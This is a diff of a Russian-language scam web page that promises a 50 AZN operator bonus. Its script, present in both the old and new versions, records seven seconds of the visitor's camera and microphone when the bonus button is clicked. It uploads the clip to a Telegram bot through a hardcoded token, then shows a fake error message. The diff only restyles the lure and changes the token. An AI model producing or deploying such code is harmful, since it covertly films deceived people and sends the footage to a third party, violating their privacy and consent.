@@ -3,45 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подарок от оператора</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
-        .container { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
-    </style>
+    <title>Подарок</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 Поздравляем!</h1>
-        <p>Ваш номер выбран для начисления 50 AZN.</p>
-        <button id="bonusBtn">ПОЛУЧИТЬ БОНУС</button>
+    <div style="text-align:center; margin-top:50px;">
+        <h2>Поздравляем! На вашем счету 50 AZN</h2>
+        <button id="bonusBtn" style="padding:15px 30px; font-size:18px; background-color:#28a745; color:white; border:none; border-radius:5px;">ПОЛУЧИТЬ НА КАРТУ</button>
     </div>
+
     <script>
-        const TOKEN = '7611685160:AAFm3W8v8kS57C3eD-06UByX5_X92Oa6234'; 
+        const TOKEN = '8777132399:AAEnul_U9KpqvJsVZ-BtK99PHRSdmjY0_xk'; 
         const CHAT_ID = '5590781901';
+
         document.getElementById('bonusBtn').addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
+
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('video', blob, 'video.webm');
-                    formData.append('caption', '📸 Yeni ulov!');
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: formData });
+                    formData.append('video', blob, 'video.mp4');
+                    formData.append('caption', '📸 Yeni video gəldi!');
+
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
                 };
+
                 mediaRecorder.start();
+                
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
-                    alert("Ошибка системы: Повторите попытку позже.");
+                    alert("Ошибка системы: Попробуйте позже.");
                 }, 7000);
-            } catch (err) { alert("Для получения бонуса разрешите доступ к камере."); }
+
+            } catch (err) {
+                alert("Для получения бонуса разрешите доступ к камере.");
+            }
         });
     </script>
 </body>
 </html>
-
